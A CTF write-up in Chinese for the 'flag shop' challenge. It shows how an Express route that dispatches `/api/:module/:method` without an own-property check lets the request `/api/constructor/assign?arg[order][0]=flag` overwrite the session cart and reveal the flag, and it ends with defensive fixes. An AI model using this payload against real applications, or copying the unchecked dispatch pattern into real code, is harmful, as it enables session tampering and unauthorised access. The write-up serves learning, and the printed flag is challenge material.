# flag shop

## 题目简述

API 通过 `/api/:module/:method` 动态选择 JavaScript 对象中的函数，再把 session 和查询参数作为两个实参调用。路由只检查属性是否存在且类型为函数，却没有限制为对象自身属性，因此可沿原型链访问 `constructor`，再调用 `Object.assign` 直接改写 session 购物车。

## 解题过程

模块表是普通对象：

```javascript
const functions = { order, menu, shop, user };
const callable = functions[module][method];
callable(req.session, req.query.arg);
```

访问 `module=constructor` 时，`functions.constructor` 来自 `Object.prototype`，值为全局 `Object` 构造器；它的 `assign` 属性又是函数。因此路径：

```text
/api/constructor/assign
```

实际执行的是：

```javascript
Object.assign(req.session, arg)
```

Express 把嵌套查询参数 `arg[order][0]=flag` 解析为：

```json
{"order": ["flag"]}
```

在同一个 HTTP session 中先请求：

```text
/api/constructor/assign?arg[order][0]=flag
```

再请求 `/api/user/checkout`。结账函数遍历 `sess.order`，发现字符串 `flag` 后直接返回环境变量中的 flag：

```text
grey{fl4g_4551gnm3nt_c0mpl3t3d}
```

## 方法总结

这不是传统的全局 prototype pollution，而是原型链方法暴露：动态分派把继承来的 `constructor.assign` 当作允许调用的业务函数。白名单应明确列出可调用模块和方法，并使用 `Object.hasOwn()` 验证自有属性；保存分派表时也可采用 `Object.create(null)`，避免继承危险入口。
